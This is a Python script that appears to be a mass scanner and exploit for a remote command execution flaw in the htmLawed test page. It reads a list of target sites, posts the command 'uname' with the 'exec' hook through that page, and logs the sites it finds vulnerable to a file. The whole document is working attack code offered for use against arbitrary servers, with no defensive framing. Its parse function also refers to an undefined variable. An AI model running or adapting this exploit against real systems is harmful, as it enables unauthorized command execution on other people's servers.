import argparse
from bs4 import BeautifulSoup
from concurrent.futures import ThreadPoolExecutor
import requests
import sys
import re
requests.packages.urllib3.disable_warnings() 

RED = '\x1b[91m'
GREEN = '\033[32m'

def exploit(url):
    if 'http' in url:
      url = url
    else:
      url = 'http://'+url
    uri = "/vendor/htmlawed/htmlawed/htmLawedTest.php"
    cmd = "uname"
    user_agent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.30300.169 Safari/537.36"
    hook = "exec"
    headers = {'User-Agent': user_agent}
    session = requests.Session()
    response_part1 = session.get(str(url)+uri, verify=False, headers=headers)
    if (response_part1.status_code != 200):
        print(RED+"Not Vuln -->"+url)
    soup = BeautifulSoup(response_part1.text, 'html.parser')
    if (soup.title.text.find("htmLawed") == -1):
        print(RED+"Not Vuln -->"+url)
    token_value = soup.find_all(id='token')[0]['value']
    sid_value = session.cookies.get("sid")
    body = {"token":token_value,"text":cmd,"hhook":hook,"sid":sid_value}
    response_part2 = session.post(str(url)+uri, verify=False, headers=headers, data=body)
    parse(response_part2.text)

def parse(response):
    soup = BeautifulSoup(response, 'html.parser')
    raw = soup.find_all(id='settingF')[0]
    return_code_search_regex = "\$spec\: (.*)"
    found_return_code = re.search(return_code_search_regex, raw.text, re.DOTALL).group(1)
    output_search_regex = "\[xml:lang\] \=\> 0\n(.*)\n\)"
    found_output = re.search(output_search_regex, raw.text, re.DOTALL)
    if "Linux" in found_return_code:
       print(GREEN+"Vuln -->"+url)
       open("vuln.txt","a").write(url+"\n")
    else:
       print(RED+"Not Vuln -->"+url)

sites = input("Site List: ")
th = input("Threads: ")
lis = open(sites, "r").read().splitlines()
with ThreadPoolExecutor(max_workers=int(th)) as executor:
    executor.map(exploit,lis)
    executor.shutdown(wait=True)